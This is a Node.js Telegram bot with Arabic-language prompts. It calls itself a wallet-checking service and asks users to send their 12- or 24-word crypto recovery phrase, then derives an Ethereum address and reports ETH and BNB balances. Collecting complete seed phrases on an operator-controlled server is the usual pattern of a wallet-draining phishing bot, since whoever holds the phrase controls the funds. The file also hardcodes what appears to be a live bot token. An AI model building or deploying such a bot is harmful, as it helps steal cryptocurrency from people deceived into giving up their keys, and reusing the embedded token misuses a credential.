const express = require('express');
const TelegramBot = require('node-telegram-bot-api');
const { ethers } = require('ethers');
const bip39 = require('bip39');

const token = '9145894502:AAGZrWnyjqNsFZlu_GqGZ_QWDMczVzFZjZw';
const PORT = process.env.PORT || 3000;
const RENDER_URL = 'https://nexvoriaapp-bot.onrender.com';

// تهيئة البوت مع تفعيل استقبال الـ Webhook بشكل صحيح
const bot = new TelegramBot(token);
const app = express();

app.use(express.json());

bot.setWebHook(`${RENDER_URL}/bot${token}`);

app.post(`/bot${token}`, (req, res) => {
    bot.processUpdate(req.body);
    res.sendStatus(200);
});

// دالة فحص المحفظة الموحدة
async function processWalletCheck(chatId, text, messageId = null) {
    const cleanText = (text || '').trim();

    if (cleanText === '/start') {
        return bot.sendMessage(chatId, 
            '🛡️ **بوت فحص المحافظ المتطور**\n\nأرسل عبارة الاسترداد (12 أو 24 كلمة) للفحص.',
            messageId ? { reply_to_message_id: messageId } : {}
        );
    }

    const words = cleanText.split(/\s+/);
    if (words.length !== 12 && words.length !== 24) {
        return; // تجاهل أي نص عادي ليس عبارة استرداد
    }

    await bot.sendMessage(chatId, '🔍 **جاري تحليل الكلمات وفحص الأرصدة الفعلية...** ⏳', 
        messageId ? { reply_to_message_id: messageId } : {}
    );

    try {
        const cleanMnemonic = cleanText.toLowerCase();
        
        if (!bip39.validateMnemonic(cleanMnemonic)) {
            return bot.sendMessage(chatId, '❌ عبارة الاسترداد غير صحيحة أو غير مفعلة.', 
                messageId ? { reply_to_message_id: messageId } : {}
            );
        }

        const seed = bip39.mnemonicToSeedSync(cleanMnemonic);
        const hdNode = ethers.HDNodeWallet.fromSeed(seed);
        const wallet = hdNode.derivePath("m/44'/60'/0'/0/0");
        const address = wallet.address;

        const ethProvider = new ethers.JsonRpcProvider('https://eth.llamarpc.com');
        const bscProvider = new ethers.JsonRpcProvider('https://bsc-dataseed.binance.org');

        const [ethBalanceWei, bscBalanceWei] = await Promise.all([
            ethProvider.getBalance(address).catch(() => 0n),
            bscProvider.getBalance(address).catch(() => 0n)
        ]);

        const ethBalance = ethers.formatEther(ethBalanceWei);
        const bscBalance = ethers.formatEther(bscBalanceWei);

        return bot.sendMessage(chatId, 
            '✅ **تم فحص المحفظة بنجاح!**\n\n' +
            '📍 **العنوان:**\n`' + address + '`\n\n' +
            '💰 **الأرصدة:**\n' +
            '• ETH: `' + ethBalance + '`\n' +
            '• BNB: `' + bscBalance + '`',
            messageId ? { reply_to_message_id: messageId, parse_mode: 'Markdown' } : { parse_mode: 'Markdown' }
        );

    } catch (error) {
        console.error("Error details:", error);
        return bot.sendMessage(chatId, '❌ حدث خطأ أثناء الاتصال بشبكات البلوكشين.', 
            messageId ? { reply_to_message_id: messageId } : {}
        );
    }
}

// الاستماع للرسائل العادية (خاص أو مجموعات)
bot.on('message', async (msg) => {
    if (msg.chat.type === 'channel') return;
    await processWalletCheck(msg.chat.id, msg.text);
});

// الاستماع المباشر لمنشورات القنوات
bot.on('channel_post', async (msg) => {
    const chatId = msg.chat.id;
    const text = msg.text || '';
    const messageId = msg.message_id;
    await processWalletCheck(chatId, text, messageId);
});

app.get('/', (req, res) => {
    res.send('Bot is running!');
});

app.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});
